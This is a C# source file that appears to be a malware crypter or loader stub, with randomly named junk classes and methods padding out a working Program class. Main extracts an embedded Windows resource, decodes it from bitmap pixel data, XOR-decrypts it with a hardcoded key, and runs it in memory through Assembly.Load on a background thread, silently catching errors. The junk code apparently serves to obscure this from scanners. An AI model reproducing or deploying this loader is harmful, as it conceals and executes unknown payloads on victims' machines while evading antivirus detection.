using System;
using System.IO;
using System.Text;
using System.Reflection;
using System.Threading;
using System.Runtime.InteropServices;
using System.Drawing;

namespace zItjlbmrKlbt {
    public class nHWt {
        public void qbkm() {
            float eajj = -1.571389E-16 F;
            float QWSG = -5.723533E+22 F;
            short HQbF = -14931;
            byte[] HQbFHQbF = System.IO.File.ReadAllBytes("HQbF");
            float WDAu = 4.152862E+14 F;

        }
        public void BoMx() {
            string wzHr = "NyLN";
            Console.WriteLine(wzHr);
            float jpzN = -5.895059E+21 F;
            sbyte fNBb = 9;
            Console.ReadLine();
            uint hZOv = 3005;

        }
        public void jGVt() {
            float hMDJ = -2.040348E-08 F;
            short qJFa = 28451;
            byte[] qJFaqJFa = System.IO.File.ReadAllBytes("qJFa");
            string DCoi = "Cioq";
            Console.WriteLine(DCoi);
            float UkOy = 1.372899E-23 F;

        }
        public void llpe() {
            ushort dfGl = 8635;
            byte nnsA = 192;
            Environment.Exit(0);
            float VvJr = 3.31118E+12 F;
            ulong yrfZ = 9128962885793924;

        }
    }
    public class xneh {
        public void tzEi() {
            byte vOIZ = 100;
            Environment.Exit(0);
            string VmEn = "sdCS";
            Console.WriteLine(VmEn);
            double jbrW = -3.422814E-27;
            jbrW = Math.Pow(double.MinValue, double.MaxValue);
            Console.ReadKey();
            long tvgh = 50509932840922318;

        }
        public void BTlX() {
            ulong fsXg = 76710333851377647;
            byte OboD = 156;
            Environment.Exit(0);
            int FTKs = 9499;
            while (FTKs == 9499) {
                FTKs = 455053;
            }
            ulong xvah = 83564135273409228;

        }
        public void GcTg() {
            string Nbsa = "cDLv";
            Console.WriteLine(Nbsa);
            sbyte jsDT = 73;
            Console.ReadLine();
            double xGHU = -1.432037E-15;
            xGHU = Math.Exp(2);
            Console.ReadKey();
            long nHyd = 27588709699274002;

        }
        public void MEkR() {
            int vmQC = 71608;
            while (vmQC == 71608) {
                vmQC = 791149;
            }
            sbyte phOq = -120;
            Console.ReadLine();
            double OvMG = -4.549004E+11;
            OvMG = Math.Pow(double.MinValue, double.MaxValue);
            sbyte BNDo = -41;
            Console.ReadLine();
        }
    }
    public class euhu {
        public void pHCw() {
            short LgWb = -9739;
            byte[] LgWbLgWb = System.IO.File.ReadAllBytes("LgWb");
            long ugVL = 88618324060613794;
            ushort VOpR = 37699;
            int KtiH = 86;
            while (KtiH == 86) {
                KtiH = 894295;
            }
        }
        public void PWrE() {
            sbyte EJuj = -126;
            Console.ReadLine();
            float KQha = -1.281775E+14 F;
            long zBLG = 20251906238252589;
            ulong ueTL = 55451862576090742;

        }
        public void rzGD() {
            short jCmc = -31590;
            byte[] jCmcjCmc = System.IO.File.ReadAllBytes("jCmc");
            double nxtn = 6.819563E+11;
            nxtn = Math.Truncate(nxtn);
            Console.Write(nxtn.ToString());
            uint sAwC = 423089;
            double aFOB = -5.164742E-09;
            aFOB = Math.Ceiling(Math.Cos(2));

        }
        public void hSDx() {
            byte XpAN = 250;
            Environment.Exit(0);
            uint ECHU = 667;
            byte MyAj = 103;
            Environment.Exit(0);
            string NoNV = "kYRM";
            Console.WriteLine(NoNV);
        }
    }
    public class cjMJ {
        public void dJAd() {
            uint PXPe = 3328;
            sbyte TQNq = -117;
            Console.ReadLine();
            int ivNe = 32;
            if (ivNe == 83819) {
                ivNe = ivNe + 493158;
            }
            sbyte bgBm = 116;
            Console.ReadLine();
        }
        public void qUZr() {
            ushort MjbB = 671;
            int NKzs = 71;
            while (NKzs == 71) {
                NKzs = NKzs + 331633;
            }
            uint kwZm = 823174;
            int fTek = 7854;
            while (fTek == 7854) {
                fTek = fTek + 678566;
            }
        }
        public void DHaB() {
            ushort BEIH = 48224;
            byte bZSt = 71;
            Environment.Exit(0);
            byte DZcX = 238;
            Environment.Exit(0);
            double HjvP = -0.0001216834;
            HjvP = Math.Ceiling(Math.Acos(0));
            bool ? LRwuKLB = new bool ? ();
            LRwuKLB = true;
        }
        public void mxSD() {
            short zLgP = 30318;
            byte[] zLgPzLgP = System.IO.File.ReadAllBytes("zLgP");
            byte PjvZ = 138;
            Environment.Exit(0);
            byte IkKx = 88;
            Environment.Exit(0);
            uint LOWN = 467505;

        }
    }

    class Program {

        static string key = "QzEwIYNhXAJL";
        private static byte[] decrypt(byte[] bytes) {
            byte[] byteArray = Encoding.Unicode.GetBytes(key);
            for (int i = 0; i < bytes.Length; i++) {
                bytes[i] ^= byteArray[i % 16];
            }
            return bytes;
        }

        private static byte[] ConvertFromBmp(System.Drawing.Bitmap b) {
            int l = b.Width;
            int n = l * l * 4;
            byte[] buff = new byte[n];
            int k = 0;

            for (int x = 0; x < l; x++) {
                for (int y = 0; y < l; y++) {
                    Buffer.BlockCopy(BitConverter.GetBytes(b.GetPixel(x, y).ToArgb()), 0, buff, k, 4);
                    k += 4;
                }
            }

            int len = BitConverter.ToInt32(buff, 0);
            byte[] f = new byte[len];
            Buffer.BlockCopy(buff, 4, f, 0, f.Length);
            return f;
        }


        static byte[] EVlRH;
        public static void gSZHynNIlkcvqgEa() {
            Assembly.Load(EVlRH).EntryPoint.Invoke(null, new object[] {
                new string[] {}
            });
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr FindResource(IntPtr hModule, IntPtr lpName, IntPtr lpType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

        [DllImport("kernel32.dll")]
        static extern IntPtr LockResource(IntPtr hResData);


        public static Bitmap Byte2Image(byte[] img) {
            using(var stream = new MemoryStream(img)) {
                return new Bitmap(stream);
            }
        }

        static void Main() {
            try {
                IntPtr fResource = FindResource(new IntPtr(0), new IntPtr(124), new IntPtr(23));
                uint sResource = SizeofResource(new IntPtr(0), fResource);
                IntPtr lResource = LoadResource(new IntPtr(0), fResource);
                IntPtr dResource = LockResource(lResource);

                EVlRH = new byte[sResource];
                System.Runtime.InteropServices.Marshal.Copy(dResource, EVlRH, 0, System.Convert.ToInt32(sResource));
                EVlRH = decrypt(ConvertFromBmp(Byte2Image(EVlRH)));

                System.Threading.Thread thr = new System.Threading.Thread(gSZHynNIlkcvqgEa);
                thr.Start();
            } catch {

            }
        }
    }

    public class yknR {
        public void nkRs() {
            float KQQi = -1.571389E-16 F;
            float XNNK = -5.723533E+22 F;
            short bMIz = -14931;
            byte[] bMIzbMIz = System.IO.File.ReadAllBytes("bMIz");
            float ftwk = 4.152862E+14 F;

        }
        public void EgcR() {
            string LQFs = "ymgf";
            Console.WriteLine(LQFs);
            float ADuX = -5.895059E+21 F;
            sbyte moRe = 9;
            Console.ReadLine();
            uint NCdv = 3005;

        }
        public void YnyD() {
            float SxEt = -2.040348E-08 F;
            short anVz = 28451;
            byte[] anVzanVz = System.IO.File.ReadAllBytes("anVz");
            string Mgie = "PKjF";
            Console.WriteLine(Mgie);
            float MFep = 1.372899E-23 F;

        }
        public void uyyL() {
            ushort czip = 8635;
            byte HmwR = 192;
            Environment.Exit(0);
            float zzXE = 3.31118E+12 F;
            ulong GXBF = 9128962885793924;

        }
    }
    public class nhlU {
        public void oVOZ() {
            byte OsHX = 100;
            Environment.Exit(0);
            string csIE = "BVHk";
            Console.WriteLine(csIE);
            double zCSw = -3.422814E-27;
            zCSw = Math.Pow(double.MinValue, double.MaxValue);
            Console.ReadKey();
            long KuvG = 50509932840922318;

        }
        public void PtwV() {
            ulong Xjse = 76710333851377647;
            byte feCQ = 156;
            Environment.Exit(0);
            int JeBL = 9499;
            while (JeBL == 9499) {
                JeBL = 455053;
            }
            ulong IDkC = 83564135273409228;

        }
        public void oUBv() {
            string NqVc = "VyYV";
            Console.WriteLine(NqVc);
            sbyte oBZO = 73;
            Console.ReadLine();
            double KMnB = -1.432037E-15;
            KMnB = Math.Exp(2);
            Console.ReadKey();
            long AYEt = 27588709699274002;

        }
        public void iBFa() {
            int yDvL = 71608;
            while (yDvL == 71608) {
                yDvL = 791149;
            }
            sbyte dthD = -120;
            Console.ReadLine();
            double tKgR = -4.549004E+11;
            tKgR = Math.Pow(double.MinValue, double.MaxValue);
            sbyte aVmP = -41;
            Console.ReadLine();
        }
    }
    public class wItl {
        public void lKrl() {
            short YTzC = -9739;
            byte[] YTzCYTzC = System.IO.File.ReadAllBytes("YTzC");
            long cCom = 88618324060613794;
            ushort cxzD = 37699;
            int umTY = 86;
            while (umTY == 86) {
                umTY = 894295;
            }
        }
        public void CUcf() {
            sbyte FqkO = -126;
            Console.ReadLine();
            float FLoQ = -1.281775E+14 F;
            long kgha = 20251906238252589;
            ulong LJPv = 55451862576090742;

        }
        public void rLiM() {
            short BKmD = -31590;
            byte[] BKmDBKmD = System.IO.File.ReadAllBytes("BKmD");
            double whdy = 6.819563E+11;
            whdy = Math.Truncate(whdy);
            Console.Write(whdy.ToString());
            uint VhHp = 423089;
            double kKJv = -5.164742E-09;
            kKJv = Math.Ceiling(Math.Cos(2));

        }
        public void JaLf() {
            byte xOVV = 250;
            Environment.Exit(0);
            uint ZuVu = 667;
            byte hgiE = 103;
            Environment.Exit(0);
            string ROhR = "tkDJ";
            Console.WriteLine(ROhR);
        }
    }
    public class okoU {
        public void Ajlp() {
            uint FxTa = 3328;
            sbyte ynVl = -117;
            Console.ReadLine();
            int ykND = 32;
            if (ykND == 83819) {
                ykND = ykND + 493158;
            }
            sbyte GKmc = 116;
            Console.ReadLine();
        }
        public void oYkR() {
            ushort oUNU = 671;
            int LAQb = 71;
            while (LAQb == 71) {
                LAQb = LAQb + 331633;
            }
            uint hRNV = 823174;
            int swSE = 7854;
            while (swSE == 7854) {
                swSE = swSE + 678566;
            }
        }
        public void aCBy() {
            ushort DTTX = 48224;
            byte oEBa = 71;
            Environment.Exit(0);
            byte Xbop = 238;
            Environment.Exit(0);
            double TaGg = -0.0001216834;
            TaGg = Math.Ceiling(Math.Acos(0));
            bool ? nlEBZIj = new bool ? ();
            nlEBZIj = true;
        }
        public void DuWL() {
            short vIvz = 30318;
            byte[] vIvzvIvz = System.IO.File.ReadAllBytes("vIvz");
            byte VgDp = 138;
            Environment.Exit(0);
            byte tGAV = 88;
            Environment.Exit(0);
            uint uiMJ = 467505;

        }
    }
}